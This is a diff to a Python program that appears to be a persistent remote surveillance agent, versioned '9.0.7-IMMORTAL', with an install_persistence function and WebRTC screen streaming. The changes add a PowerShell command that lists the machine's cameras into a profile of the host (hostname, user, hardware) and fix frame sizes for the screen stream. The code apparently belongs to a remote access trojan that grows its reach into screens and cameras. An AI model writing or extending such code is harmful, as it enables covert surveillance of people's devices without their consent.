@@ -21,7 +21,7 @@ import av
 from aiortc import RTCPeerConnection, RTCSessionDescription, VideoStreamTrack, AudioStreamTrack, RTCRtpSender, RTCConfiguration, RTCIceServer
 from aiortc.contrib.media import MediaStreamTrack, MediaRelay
 
-AGENT_VERSION = "9.0.3-IMMORTAL"
+AGENT_VERSION = "9.0.7-IMMORTAL"
 
 def install_persistence():
     current_exe = sys.executable
@@ -156,6 +156,12 @@ def get_detailed_specs():
             gpu = output.split('\n')[1].strip()
         except: pass
         
+        try:
+            cam_output = subprocess.check_output('powershell -NoProfile -Command "Get-PnpDevice -Class Camera,Image -Status OK | Select-Object -ExpandProperty FriendlyName"', shell=True).decode()
+            cams = [n.strip() for n in cam_output.split('\n') if n.strip() and not n.startswith("FriendlyName")]
+        except:
+            cams = []
+            
         disk = psutil.disk_usage('C:/').percent
         return {
             "name": socket.gethostname(),
@@ -164,9 +170,10 @@ def get_detailed_specs():
             "cpu": f"{psutil.cpu_count()} Cores",
             "ram": f"{round(psutil.virtual_memory().total / (1024**3), 1)}GB",
             "gpu": gpu,
-            "disk": f"{disk}% used"
+            "disk": f"{disk}% used",
+            "cameras": cams
         }
-    except: return {"name": "Unknown", "user": "Unknown"}
+    except: return {"name": "Unknown", "user": "Unknown", "cameras": []}
 
 # -------------------------------------------------------
 # WebRTC Tracks
@@ -246,10 +253,14 @@ class ScreenVideoTrack(VideoStreamTrack):
             
             if w > limit:
                 new_h = int(h * (limit / w))
+                new_h = new_h - (new_h % 2) # Force even for YUV420P
                 frame = frame.reformat(width=limit, height=new_h, format='yuv420p')
             else:
-                frame = frame.reformat(format='yuv420p')
+                w, h = w - (w % 2), h - (h % 2)
+                frame = frame.reformat(width=w, height=h, format='yuv420p')
         except Exception as e:
+            import traceback
+            traceback.print_exc()
             print("Video Render Memory/Alignment Error:", e)
             frame = av.VideoFrame(width=960, height=540, format='yuv420p')
             for p in frame.planes: p.update(b'\x00' * p.buffer_size)
